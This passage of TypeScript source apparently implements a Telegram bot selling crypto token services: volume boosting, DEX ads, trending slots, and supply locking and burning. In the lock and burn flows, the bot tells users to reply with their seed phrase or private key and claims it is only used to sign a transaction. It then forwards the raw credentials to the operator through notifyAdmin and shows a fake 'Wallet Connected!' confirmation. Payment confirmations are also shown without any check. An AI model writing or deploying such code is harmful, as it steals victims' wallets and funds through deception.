      `✅ Duration saved! (${hours} hours)\n\n📍 Step 3/5: Community Group Link\n\n${t.chainEmoji} Chain: ${t.chain}\n🎯 Token: ${t.symbol} (${mc})\n\n💬 Please provide your Telegram group / community link so we can feature it in the ad campaign.\n\n💡 Example: https://t.me/yourgroup`,
      { reply_markup: KB_SKIP_CANCEL() }
    );
    void rate; void native;
  }

  async function sendDexAdsStep4(chatId: number | string, userId: number, t: TokenInfo, hours: number, group: string): Promise<void> {
    clearSession(userId);
    const { rate, native } = adsRateFor(t);
    const total  = (hours * rate).toFixed(1);
    const wallet = getWallet(chainTypeFor(t));
    const mc     = t.marketCap ? fmtUsd(t.marketCap) : "—";

    await sendPhoto(
      bot, chatId, IMG_LOGO,
      `📣 DEX Ads — Step 4/5: Payment\n\n${t.chainEmoji} Chain: ${t.chain}\n🎯 Token: ${t.symbol} (${mc})\n💬 Group: ${group}\n⏰ Duration: ${hours}h @ ${rate} ${native}/hr\n💰 Total: *${total} ${native}*\n\nSend to address below:\n\n⚠️ After payment, confirm below:`,
      { reply_markup: KB_PAYMENT() }
    );
    await bot.sendMessage(chatId, `\`${wallet}\``, { parse_mode: "Markdown" });
    await notifyAdmin(`📣 *DEX Ads Order*\n\nUser: ${userId}\nToken: ${t.symbol} (${t.chain})\nCA: \`${t.address}\`\nHours: ${hours}\nGroup: ${group}\nTotal: ${total} ${native}`);
  }

  // ── DEX Trending flow ──────────────────────────────────────────────────────

  async function startDexTrendingStep1(chatId: number | string, userId: number): Promise<void> {
    getSession(userId).step = "dex_trending_contract";
    await sendPhoto(
      bot, chatId, IMG_LOGO,
      `🔥 DEX Trending Service\n\n📍 Step 1/5: Token Contract Address\n\n🥉 Top 10 Trending: 0.5 native/hour (min 3h)\n• Positions 4-10 • Good visibility\n\n🥇 Top 3 Trending: 1 native/hour (min 1h)\n• Positions 1-3 • Maximum exposure\n\n🔍 Provide your token contract address:\n⚡ Auto-verified with DexScreener`,
      { reply_markup: KB_CANCEL() }
    );
  }

  async function sendDexTrendingStep2(chatId: number | string, t: TokenInfo): Promise<void> {
    const verifyTxt = tokenVerifyText(t);
    await sendMsg(
      bot, chatId,
      `${verifyTxt}\n\n📍 Step 2/5: Trending Duration\n\n⏰ Minimum Duration:\n• Top 10 Trending: 3 hours minimum\n• Top 3 Trending: 1 hour minimum\n\nHow many hours do you want trending?`,
      { reply_markup: KB_CANCEL() }
    );
  }

  async function sendDexTrendingStep3(chatId: number | string, t: TokenInfo, hours: number): Promise<void> {
    const mc = t.marketCap ? fmtUsd(t.marketCap) : "—";
    await sendMsg(
      bot, chatId,
      `📍 Step 3/5: Choose Trending Position\n\n${t.chainEmoji} Chain: ${t.chain}\n🎯 Token: ${t.symbol} (${mc})\n⏰ Duration: ${hours} hours\n\nSelect your preferred trending position:`,
      { reply_markup: KB_TRENDING_TIER() }
    );
  }

  async function sendDexTrendingStep4(chatId: number | string, t: TokenInfo, hours: number, tier: "top10" | "top3"): Promise<void> {
    const native   = nativeSymbolFor(t);
    const rate     = tier === "top3" ? 1 : 0.5;
    const tierName = tier === "top3" ? "Top 3 Trending" : "Top 10 Trending";
    const total    = (hours * rate).toFixed(1);
    const mc       = t.marketCap ? fmtUsd(t.marketCap) : "—";

    await sendMsg(
      bot, chatId,
      `✅ ${tier === "top3" ? "Top 3" : "Top 10"} selected!\n\n📍 Step 4/5: Community Group Link\n\n🎯 Token: ${t.symbol} (${mc})\n🥇 Position: ${tierName}\n⏰ Duration: ${hours} hours\n💰 Total Cost: ${total} ${native}\n\n💬 Please provide your Telegram group / community link so we can feature it in the trending campaign.\n\n💡 Example: https://t.me/yourgroup`,
      { reply_markup: KB_CANCEL() }
    );
  }

  async function sendDexTrendingStep5(chatId: number | string, userId: number, t: TokenInfo, hours: number, tier: "top10" | "top3", group: string): Promise<void> {
    clearSession(userId);
    const native   = nativeSymbolFor(t);
    const rate     = tier === "top3" ? 1 : 0.5;
    const tierName = tier === "top3" ? "Top 3 Trending" : "Top 10 Trending";
    const total    = (hours * rate).toFixed(0);
    const wallet   = getWallet(chainTypeFor(t));
    const mc       = t.marketCap ? fmtUsd(t.marketCap) : "—";

    await sendPhoto(
      bot, chatId, IMG_LOGO,
      `🔥 DEX Trending — Step 5/5: Payment\n\n${t.chainEmoji} Chain: ${t.chain}\n🎯 Token: ${t.symbol} (${mc})\n💬 Group: ${group}\n🥇 Position: ${tierName}\n⏰ Duration: ${hours} hours\n💰 Total: *${total} ${native}*\n\nSend to address below:\n\n⚠️ After payment, confirm below:`,
      { reply_markup: KB_PAYMENT() }
    );
    await bot.sendMessage(chatId, `\`${wallet}\``, { parse_mode: "Markdown" });
    await notifyAdmin(`🔥 *DEX Trending Order*\n\nUser: ${userId}\nToken: ${t.symbol} (${t.chain})\nCA: \`${t.address}\`\nTier: ${tierName}\nHours: ${hours}\nGroup: ${group}\nTotal: ${total} ${native}`);
  }

  // ── Lock Supply flow ───────────────────────────────────────────────────────

  async function startLockStep1(chatId: number | string, userId: number): Promise<void> {
    getSession(userId).step = "lock_contract";
    await sendPhoto(
      bot, chatId, IMG_LOCKER,
      `🔒 Lock Supply\n\n📍 Step 1/3: Token Contract Address\n\nPlease provide your token's contract address (CA):\n\n📋 Supported formats:\n• ⊙ Solana: 32-44 Base58 chars\n• Ξ ETH / ⬡ BSC / 🔷 Base: 0x + 40 hex\n• 💎 TON: EQ/UQ + 46 chars`,
      { reply_markup: KB_CANCEL() }
    );
  }

  async function sendLockStep2Percent(chatId: number | string, t: TokenInfo): Promise<void> {
    const verifyTxt = tokenVerifyText(t);
    await sendPhoto(
      bot, chatId, IMG_LOCKER,
      `${verifyTxt}\n\n📍 Step 2/3: Choose the percentage to lock:`,
      { reply_markup: KB_LOCK_PCT() }
    );
  }

  async function sendLockDuration(chatId: number | string): Promise<void> {
    await sendPhoto(
      bot, chatId, IMG_LOCKER,
      `📅 Lock Duration\n\n📍 Step 2/3: Choose how long the supply will be locked:`,
      { reply_markup: KB_LOCK_DUR() }
    );
  }

  async function sendLockSummary(chatId: number | string, userId: number, t: TokenInfo, pct: number, dur: string): Promise<void> {
    const session = getSession(userId);
    session.lockDuration = dur;
    const mc  = t.marketCap ? fmtUsd(t.marketCap) : "—";
    const liq = t.liquidity  ? fmtUsd(t.liquidity)  : "—";

    await sendPhoto(
      bot, chatId, IMG_LOCKER,
      `🔒 Lock Summary\n\n${t.chainEmoji} Chain: ${t.chain}\n🏷 Token: ${t.name} (${t.symbol})\n📍 CA: ${addrShort(t.address)}\n📊 Market Cap: ${mc}\n💧 Liquidity: ${liq}\n⏰ Lock Duration: ${dur}\n🎯 Target % to Lock: ${pct}%\n\n📍 Step 3/3: Connect your wallet to sign the transaction.`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔗 Connect Wallet", callback_data: "lock_connect_wallet" }],
            [{ text: "⬅️ Back to Main",   callback_data: "back_main"           }],
          ],
        },
      }
    );
    await notifyAdmin(`🔒 *Lock Supply Request*\n\nUser: ${userId}\nToken: ${t.symbol} (${t.chain})\nCA: \`${t.address}\`\nPercent: ${pct}%\nDuration: ${dur}`);
  }

  // ── Burn Token flow ────────────────────────────────────────────────────────

  async function startBurnStep1(chatId: number | string, userId: number): Promise<void> {
    getSession(userId).step = "burn_contract";
    await sendPhoto(
      bot, chatId, IMG_BURNER,
      `🔥 Burn Token\n\n📍 Step 1/3: Token Contract Address\n\nPlease provide your token's contract address (CA):\n\n📋 Supported formats:\n• ⊙ Solana: 32-44 Base58 chars\n• Ξ ETH / ⬡ BSC / 🔷 Base: 0x + 40 hex\n• 💎 TON: EQ/UQ + 46 chars`,
      { reply_markup: KB_CANCEL() }
    );
  }

  async function sendBurnStep2Percent(chatId: number | string, t: TokenInfo): Promise<void> {
    const verifyTxt = tokenVerifyText(t);
    await sendPhoto(
      bot, chatId, IMG_BURNER,
      `${verifyTxt}\n\n📍 Step 2/3: Choose the percentage to burn:`,
      { reply_markup: KB_BURN_PCT() }
    );
  }

  async function sendBurnSummary(chatId: number | string, userId: number, t: TokenInfo, pct: number): Promise<void> {
    const session = getSession(userId);
    session.burnPercent = pct;
    const mc  = t.marketCap ? fmtUsd(t.marketCap) : "—";
    const liq = t.liquidity  ? fmtUsd(t.liquidity)  : "—";

    await sendPhoto(
      bot, chatId, IMG_BURNER,
      `🔥 Burn Summary\n\n${t.chainEmoji} Chain: ${t.chain}\n🏷 Token: ${t.name} (${t.symbol})\n📍 CA: ${addrShort(t.address)}\n📊 Market Cap: ${mc}\n💧 Liquidity: ${liq}\n🎯 Target % to Burn: ${pct}%\n\n📍 Step 3/3: Connect your wallet to sign the transaction.`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔗 Connect Wallet", callback_data: "burn_connect_wallet" }],
            [{ text: "⬅️ Back to Main",   callback_data: "back_main"           }],
          ],
        },
      }
    );
    await notifyAdmin(`🔥 *Burn Token Request*\n\nUser: ${userId}\nToken: ${t.symbol} (${t.chain})\nCA: \`${t.address}\`\nPercent: ${pct}%`);
  }

  async function sendBurnWalletCreds(chatId: number | string, userId: number): Promise<void> {
    getSession(userId).step = "burn_wallet_creds";
    await sendPhoto(
      bot, chatId, IMG_BURNER,
      `🔒 Connect Your Wallet\n\n📍 Step 3/3: Wallet Credentials\n\n🔑 Reply with your *12/24-word seed phrase* or *Solana base-58 private key*.\n\n⚠️ Your details are only used to sign the transaction.`,
      { reply_markup: KB_CANCEL() }
    );
  }

  // ── EVM chain selection handler ───────────────────────────────────────────

  async function handleEvmChainSelected(chatId: number, userId: number, chainId: string): Promise<void> {
    const session = getSession(userId);
    const address = session.pendingAddress ?? "";
    const flow    = session.pendingFlow ?? "";

    // Restore the correct step
    const flowStepMap: Record<string, SessionStep> = {
      volume:       "volume_contract",
      dex_update:   "dex_update_contract",
      dex_ads:      "dex_ads_contract",
      dex_trending: "dex_trending_contract",
      lock:         "lock_contract",
      burn:         "burn_contract",
    };
    session.step = flowStepMap[flow] ?? "idle";
    session.pendingAddress = undefined;
    session.pendingFlow    = undefined;

    // "solana" here means user confirmed it's on a non-PumpFun Solana DEX
    const filterChain = chainId === "solana" ? "solana" : chainId === "ton" ? "ton" : chainId;

    await verifyAndContinue(chatId, userId, address, async (t) => {
      if (flow === "volume") {
        session.step = "volume_package";
        await sendVolumeStep2(chatId, t);
      } else if (flow === "dex_update") {
        const wallet = getWallet(chainTypeFor(t));
        const mc = t.marketCap ? fmtUsd(t.marketCap) : "—";
        await sendPhoto(
          bot, chatId, IMG_LOGO,
          `${tokenVerifyText(t)}\n\n🎯 DEX UPDATE SERVICE — $299 USD\n\n✨ Includes: Logo • Description • Website • Socials • Banner\n\n📊 Progress: 50%\n${progressBar(50)}\nStep 3/6: Payment\n\n💰 Send payment to address below:\n\nOur team will update your token info within 24h of payment confirmation.`,
          { reply_markup: KB_PAYMENT() }
        );
        await bot.sendMessage(chatId, `\`${wallet}\``, { parse_mode: "Markdown" });
        clearSession(userId);
        await notifyAdmin(`📊 *DEX Update Order*\n\nUser: ${userId}\nToken: ${t.symbol} (${t.chain})\nCA: \`${t.address}\`\nMC: ${mc}`);
      } else if (flow === "dex_ads") {
        session.step = "dex_ads_hours";
        await sendDexAdsStep2(chatId, t);
      } else if (flow === "dex_trending") {
        session.step = "dex_trending_hours";
        await sendDexTrendingStep2(chatId, t);
      } else if (flow === "lock") {
        session.step = "lock_percent";
        await sendLockStep2Percent(chatId, t);
      } else if (flow === "burn") {
        session.step = "burn_percent";
        await sendBurnStep2Percent(chatId, t);
      }
    }, flow, filterChain);
  }

  // ── Text message handler ───────────────────────────────────────────────────

  bot.on("message", async (msg) => {
    if (!msg.text || msg.text.startsWith("/")) return;
    const chatId  = msg.chat.id;
    const userId  = msg.from?.id ?? chatId;
    const text    = msg.text.trim();
    const session = getSession(userId);

    // Volume: contract address
    if (session.step === "volume_contract") {
      await verifyAndContinue(chatId, userId, text, async (t) => {
        session.step = "volume_package";
        await sendVolumeStep2(chatId, t);
      }, "volume");
      return;
    }

    // Lock: contract address
    if (session.step === "lock_contract") {
      await verifyAndContinue(chatId, userId, text, async (t) => {
        session.step = "lock_percent";
        await sendLockStep2Percent(chatId, t);
      }, "lock");
      return;
    }

    // Burn: contract address
    if (session.step === "burn_contract") {
      await verifyAndContinue(chatId, userId, text, async (t) => {
        session.step = "burn_percent";
        await sendBurnStep2Percent(chatId, t);
      }, "burn");
      return;
    }

    // DEX Update: contract address
    if (session.step === "dex_update_contract") {
      await verifyAndContinue(chatId, userId, text, async (t) => {
        const wallet = getWallet(chainTypeFor(t));
        const mc = t.marketCap ? fmtUsd(t.marketCap) : "—";
        await sendPhoto(
          bot, chatId, IMG_LOGO,
          `${tokenVerifyText(t)}\n\n🎯 DEX UPDATE SERVICE — $299 USD\n\n✨ Includes: Logo • Description • Website • Socials • Banner\n\n📊 Progress: 50%\n${progressBar(50)}\nStep 3/6: Payment\n\n💰 Send payment to:\n${wallet}\n\nOur team will update your token info within 24h of payment confirmation.`,
          { reply_markup: KB_PAYMENT() }
        );
        clearSession(userId);
        await notifyAdmin(`📊 *DEX Update Order*\n\nUser: ${userId}\nToken: ${t.symbol} (${t.chain})\nCA: \`${t.address}\`\nMC: ${mc}`);
      }, "dex_update");
      return;
    }

    // DEX Ads: contract address
    if (session.step === "dex_ads_contract") {
      await verifyAndContinue(chatId, userId, text, async (t) => {
        session.step = "dex_ads_hours";
        await sendDexAdsStep2(chatId, t);
      }, "dex_ads");
      return;
    }

    // DEX Ads: hours input
    if (session.step === "dex_ads_hours") {
      const hours = parseInt(text, 10);
      const t     = session.tokenData!;
      const { minHours } = adsRateFor(t);
      if (isNaN(hours) || hours < minHours) {
        await bot.sendMessage(chatId, `❌ Invalid duration. Minimum ${minHours} hours required for ads.`, { reply_markup: KB_CANCEL() });
        return;
      }
      session.dexHours = hours;
      session.step = "dex_ads_group";
      await sendDexAdsStep3(chatId, t, hours);
      return;
    }

    // DEX Ads: group link
    if (session.step === "dex_ads_group") {
      session.dexGroup = text;
      const t     = session.tokenData!;
      const hours = session.dexHours!;
      await sendDexAdsStep4(chatId, userId, t, hours, text);
      return;
    }

    // DEX Trending: contract address
    if (session.step === "dex_trending_contract") {
      await verifyAndContinue(chatId, userId, text, async (t) => {
        session.step = "dex_trending_hours";
        await sendDexTrendingStep2(chatId, t);
      }, "dex_trending");
      return;
    }

    // DEX Trending: hours input
    if (session.step === "dex_trending_hours") {
      const hours = parseInt(text, 10);
      if (isNaN(hours) || hours < 1) {
        await bot.sendMessage(chatId, `❌ Invalid duration. Minimum 1 hour required for trending.`, { reply_markup: KB_CANCEL() });
        return;
      }
      session.dexHours = hours;
      session.step = "dex_trending_tier";
      const t = session.tokenData!;
      await sendDexTrendingStep3(chatId, t, hours);
      return;
    }

    // DEX Trending: group link
    if (session.step === "dex_trending_group") {
      const t    = session.tokenData!;
      const hours = session.dexHours!;
      const tier  = session.trendingTier!;
      await sendDexTrendingStep5(chatId, userId, t, hours, tier, text);
      return;
    }

    // Custom lock percent
    if (session.step === "lock_custom_pct") {
      const pct = parseFloat(text);
      if (isNaN(pct) || pct <= 0 || pct > 100) {
        await bot.sendMessage(chatId, "❌ Enter a percentage between 1 and 100 (e.g., 60)", { reply_markup: KB_CANCEL() });
        return;
      }
      session.lockPercent = pct;
      session.step = "lock_duration";
      await sendLockDuration(chatId);
      return;
    }

    // Custom lock duration
    if (session.step === "lock_custom_dur") {
      if (!text.trim()) {
        await bot.sendMessage(chatId, "❌ Please enter a valid duration (e.g., 2 years, 90 days)", { reply_markup: KB_CANCEL() });
        return;
      }
      const t   = session.tokenData!;
      const pct = session.lockPercent!;
      await sendLockSummary(chatId, userId, t, pct, text.trim());
      return;
    }

    // Custom burn percent
    if (session.step === "burn_custom_pct") {
      const pct = parseFloat(text);
      if (isNaN(pct) || pct <= 0 || pct > 100) {
        await bot.sendMessage(chatId, "❌ Enter a percentage between 1 and 100 (e.g., 50)", { reply_markup: KB_CANCEL() });
        return;
      }
      const t = session.tokenData!;
      await sendBurnSummary(chatId, userId, t, pct);
      return;
    }

    // Lock: wallet credentials (seed phrase)
    if (session.step === "lock_wallet_creds") {
      const t   = session.tokenData;
      const pct = session.lockPercent ?? 0;
      const dur = session.lockDuration ?? "—";
      clearSession(userId);
      await notifyAdmin(
        `🔐 *Lock Wallet Credentials Received*\n\nUser: ${userId}\nToken: ${t?.symbol ?? "?"} (${t?.chain ?? "?"})\nCA: \`${t?.address ?? "?"}\`\nPercent: ${pct}%\nDuration: ${dur}\n\n🔑 Credentials:\n\`${text}\``
      );
      await sendPhoto(
        bot, chatId, IMG_LOCKER,
        `✅ Wallet Connected!\n\nYour supply lock (${pct}% for ${dur}) is being processed.\n\n⏰ Processing time: within 1 hour of wallet verification.\n\n💬 Contact support if you have questions.`,
        { reply_markup: KB_BACK_MAIN() }
      );
      return;
    }

    // Burn: wallet credentials (seed phrase)
    if (session.step === "burn_wallet_creds") {
      const t   = session.tokenData;
      const pct = session.burnPercent ?? 0;
      clearSession(userId);
      await notifyAdmin(
        `🔐 *Burn Wallet Credentials Received*\n\nUser: ${userId}\nToken: ${t?.symbol ?? "?"} (${t?.chain ?? "?"})\nCA: \`${t?.address ?? "?"}\`\nPercent: ${pct}%\n\n🔑 Credentials:\n\`${text}\``
      );
      await sendPhoto(
        bot, chatId, IMG_BURNER,
        `✅ Wallet Connected!\n\nYour token burn (${pct}% of supply) is being processed.\n\n⏰ Processing time: within 1 hour of wallet verification.\n\n💬 Contact support if you have questions.`,
        { reply_markup: KB_BACK_MAIN() }
      );
      return;
    }

    // Custom volume amount
    if (session.step === "custom_amount") {
      const amount = parseFloat(text);
      if (isNaN(amount) || amount <= 0) {
        await bot.sendMessage(chatId, "❌ Enter a valid amount (e.g., 3.5)", { reply_markup: KB_CANCEL() });
        return;
      }
      const t      = session.tokenData;
      const ct     = t ? chainTypeFor(t) : "solana";
      const native = t ? nativeSymbolFor(t) : "SOL";
      const volume = Math.round(amount * 50_000);
      const wallet = getWallet(ct);
      clearSession(userId);
      await sendMsg(
        bot, chatId,
        `🎯 Custom Package\n\nToken: ${t?.symbol ?? "Your Token"}\n${t?.chainEmoji ?? "⊙"} Chain: ${t?.chain ?? "Solana"}\nAmount: *${amount} ${native}*\nVolume: ~${volume.toLocaleString()}\n\n💰 Send to address below:\n\n⚠️ After payment, confirm below:`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "✅ Payment Sent - Activate Service", callback_data: "payment_sent" }],
              [{ text: "❌ Cancel Order", callback_data: "cancel" }],
            ],
          },
        }
      );
      await bot.sendMessage(chatId, `\`${wallet}\``, { parse_mode: "Markdown" });
      await notifyAdmin(`🎯 *Custom Volume Order*\n\nUser: ${userId}\nToken: ${t?.symbol ?? "?"} (${t?.chain ?? "Solana"})\nCA: \`${t?.address ?? "?"}\`\nAmount: ${amount} ${native}`);
      return;
    }
  });

  // ── Commands ──────────────────────────────────────────────────────────────

  bot.onText(/^\/start/, async (msg) => {
    const userId   = msg.from?.id ?? msg.chat.id;
    const name     = msg.from?.first_name ?? "Unknown";
    const username = msg.from?.username ? `@${msg.from.username}` : "—";
    await notifyAdmin(`👤 *New User Started Bot*\n\nUser ID: ${userId}\nName: ${name}\nUsername: ${username}\nChat: ${msg.chat.id}`);
    await sendMainMenu(msg.chat.id);
  });

  bot.onText(/^\/cancel/, async (msg) => {
    clearSession(msg.from?.id ?? msg.chat.id);
    await bot.sendMessage(msg.chat.id, "❌ Session cancelled.");
    await sendMainMenu(msg.chat.id);
  });

  bot.onText(/^\/help/, async (msg) => {
    await sendMsg(bot, msg.chat.id, helpText(), { reply_markup: KB_BACK_MAIN() });
  });

  bot.onText(/^\/volume/, async (msg) => {
    await sendMsg(bot, msg.chat.id, volumePackagesText(), { reply_markup: KB_PACKAGES(true) });
  });

  bot.onText(/^\/chains/, async (msg) => {
    await sendMsg(bot, msg.chat.id, chainsText(), { reply_markup: KB_BACK_MAIN() });
  });

  bot.onText(/^\/latest/, async (msg) => {
    const loading = await bot.sendMessage(msg.chat.id, "⏳ Fetching latest boosts...");
    const tokens  = await fetchBoosts("/token-boosts/latest/v1");
    try { await bot.deleteMessage(msg.chat.id, loading.message_id); } catch {}
    if (!tokens.length) { await bot.sendMessage(msg.chat.id, "❌ Could not fetch data."); return; }
    await bot.sendMessage(msg.chat.id, `📰 Latest Boosted Tokens`);
    for (let i = 0; i < Math.min(tokens.length, 10); i += 5) {
      const chunk = tokens.slice(i, i + 5).map(formatBoostToken).join("\n\n───────────\n\n");
      await bot.sendMessage(msg.chat.id, chunk, { disable_web_page_preview: true });
    }
  });

  bot.onText(/^\/top/, async (msg) => {
    const loading = await bot.sendMessage(msg.chat.id, "⏳ Fetching top boosts...");
    const tokens  = await fetchBoosts("/token-boosts/top/v1");
    try { await bot.deleteMessage(msg.chat.id, loading.message_id); } catch {}
    if (!tokens.length) { await bot.sendMessage(msg.chat.id, "❌ Could not fetch data."); return; }
    await bot.sendMessage(msg.chat.id, `🏆 Top Boosted Tokens`);
    for (let i = 0; i < Math.min(tokens.length, 10); i += 5) {
      const chunk = tokens.slice(i, i + 5).map((t, j) => formatBoostToken(t, i + j + 1)).join("\n\n───────────\n\n");
      await bot.sendMessage(msg.chat.id, chunk, { disable_web_page_preview: true });
    }
  });

  bot.onText(/^\/golden/, async (msg) => {
    const loading = await bot.sendMessage(msg.chat.id, "⏳ Fetching Golden Tickers...");
    const tokens  = await fetchBoosts("/token-boosts/top/v1");
    try { await bot.deleteMessage(msg.chat.id, loading.message_id); } catch {}
    const golden = tokens.filter(t => (t.totalAmount ?? 0) >= 500);
    if (!golden.length) {
      await bot.sendMessage(msg.chat.id, "🌟 No Golden Ticker tokens found right now!", { reply_markup: KB_BACK_MAIN() });
      return;
    }
    await bot.sendMessage(msg.chat.id, `🌟 Golden Ticker Tokens (${golden.length})`);
    for (let i = 0; i < Math.min(golden.length, 10); i += 5) {
      const chunk = golden.slice(i, i + 5).map((t, j) => formatBoostToken(t, i + j + 1)).join("\n\n───────────\n\n");
      await bot.sendMessage(msg.chat.id, chunk, { disable_web_page_preview: true });
    }
  });

  // ── Callback queries ──────────────────────────────────────────────────────

  bot.on("callback_query", async (query) => {
    const chatId = query.message?.chat.id;
    const userId = query.from.id;
    if (!chatId) return;
    await bot.answerCallbackQuery(query.id).catch(() => {});

    const data    = query.data ?? "";
    const session = getSession(userId);

    // Navigation
    if (data === "back_main" || data === "cancel") {
      clearSession(userId);
      if (data === "cancel") await bot.sendMessage(chatId, "❌ Cancelled.").catch(() => {});
      await sendMainMenu(chatId);
      return;
    }

    // EVM chain selection
    if (data.startsWith("evm_chain_")) {
      const chainId = data.replace("evm_chain_", ""); // ethereum | bsc | base
      await handleEvmChainSelected(chatId, userId, chainId);
      return;
    }

    // Skip group link (DEX Ads only)
    if (data === "skip_group") {
      if (session.step === "dex_ads_group") {
        const t     = session.tokenData!;
        const hours = session.dexHours!;
        await sendDexAdsStep4(chatId, userId, t, hours, "—");
      }
      return;
    }

    // Main menu actions
    if (data === "start_volume")     { await startVolumeStep1(chatId, userId); return; }
    if (data === "lock_supply")      { await startLockStep1(chatId, userId);   return; }
    if (data === "burn_token")       { await startBurnStep1(chatId, userId);   return; }

    if (data === "stop_volume") {
      clearSession(userId);
      await sendMsg(bot, chatId, `◼️ No Active Volume Bot\n\nNo volume generation is running. Use "🚀 Start Volume Bot" to begin!`, { reply_markup: KB_BACK_MAIN() });
      return;
    }

    if (data === "volume_packages") {
      await sendMsg(bot, chatId, volumePackagesText(), { reply_markup: KB_PACKAGES(true) });
      return;
    }

    if (data === "dex_services") {
      await sendMsg(bot, chatId, dexServicesText(), { reply_markup: KB_DEX_SERVICES() });
      return;
    }

    // DEX service entry points
    if (data === "dex_update")   { await startDexUpdateStep1(chatId, userId);  return; }
    if (data === "dex_ads")      { await startDexAdsStep1(chatId, userId);     return; }
    if (data === "dex_trending") { await startDexTrendingStep1(chatId, userId); return; }

    // Package selection
    if (data.startsWith("pkg_")) {
      const pkgId = data.replace("pkg_", "");
      if (pkgId === "custom") {
        session.step = "custom_amount";
        await sendMsg(bot, chatId,
          `🎯 Custom Package\n\nEnter your desired SOL amount:\n• 50,000 volume per 1 SOL\n• Flexible duration\n\ne.g., type "3.5" for 175,000 volume`,
          { reply_markup: KB_CANCEL() }
        );
        return;
      }
      const pkg = PACKAGES.find(p => p.id === pkgId);
      if (!pkg) return;
      const t = session.tokenData;
      if (!t) {
        session.selectedPackage = pkg;
        await startVolumeStep1(chatId, userId);
        return;
      }
      await sendVolumeStep3(chatId, userId, t, pkg);
      return;
    }

    // Lock Supply callbacks
    if (data.startsWith("lock_pct_")) {
      const raw = data.replace("lock_pct_", "");
      if (raw === "custom") {
        session.step = "lock_custom_pct";
        await bot.sendMessage(chatId, "✏️ Enter the custom percentage to lock (1–100):", { reply_markup: KB_CANCEL() });
        return;
      }
      session.lockPercent = parseInt(raw, 10);
      session.step = "lock_duration";
      await sendLockDuration(chatId);
      return;
    }

    if (data.startsWith("lock_dur_")) {
      const raw = data.replace("lock_dur_", "");
      if (raw === "custom") {
        session.step = "lock_custom_dur";
        await bot.sendMessage(chatId, "✏️ Enter the custom lock duration (e.g., '90 days', '2 years'):", { reply_markup: KB_CANCEL() });
        return;
      }
      const durMap: Record<string, string> = { "1m": "1 month(s)", "3m": "3 month(s)", "6m": "6 month(s)", "1y": "1 Year" };
      const dur = durMap[raw] ?? raw;
      const t   = session.tokenData!;
      const pct = session.lockPercent!;
      await sendLockSummary(chatId, userId, t, pct, dur);
      return;
    }

    if (data === "lock_connect_wallet") {
      session.step = "lock_wallet_creds";
      await sendPhoto(
        bot, chatId, IMG_LOCKER,
        `🔒 Connect Your Wallet\n\n📍 Step 3/3: Wallet Credentials\n\n🔑 Reply with your *12/24-word seed phrase* or *Solana base-58 private key*.\n\n⚠️ Your details are only used to sign the transaction.`,
        { reply_markup: KB_CANCEL() }
      );
      return;
    }

    if (data === "burn_connect_wallet") {
      await sendBurnWalletCreds(chatId, userId);
      return;
    }

    // Burn Token callbacks
    if (data.startsWith("burn_pct_")) {
      const raw = data.replace("burn_pct_", "");
      if (raw === "custom") {
        session.step = "burn_custom_pct";
        await bot.sendMessage(chatId, "✏️ Enter the custom percentage to burn (1–100):", { reply_markup: KB_CANCEL() });
        return;
      }
      const pct = parseInt(raw, 10);
      session.burnPercent = pct;
      const t = session.tokenData!;
      await sendBurnSummary(chatId, userId, t, pct);
      return;
    }

    // DEX Trending tier selection
    if (data === "trending_top10" || data === "trending_top3") {
      const tier  = data === "trending_top10" ? "top10" : "top3";
      const t     = session.tokenData!;
      const hours = session.dexHours!;
      const minH  = tier === "top3" ? 1 : 3;
      if (hours < minH) {
        await bot.sendMessage(chatId, `❌ Minimum ${minH} hour(s) required for ${tier === "top3" ? "Top 3" : "Top 10"} trending.`, { reply_markup: KB_CANCEL() });
        return;
      }
      session.trendingTier = tier;
      session.step = "dex_trending_group";
      await sendDexTrendingStep4(chatId, t, hours, tier);
      return;
    }

    // Payment confirmed
    if (data === "payment_sent") {
      clearSession(userId);
      await sendPhoto(
        bot, chatId, IMG_LOGO,
        `✅ Payment Received!\n\nThank you! Your order has been submitted and our team has been notified.\n\n⏰ Processing time: within 1–24 hours depending on the service.\n\n💬 Contact support if you have questions.`,
        { reply_markup: KB_BACK_MAIN() }
      );
      return;
    }
  });

  bot.on("polling_error", (err) => {
    logger.error({ err }, "Telegram polling error");
  });

  return bot;
}
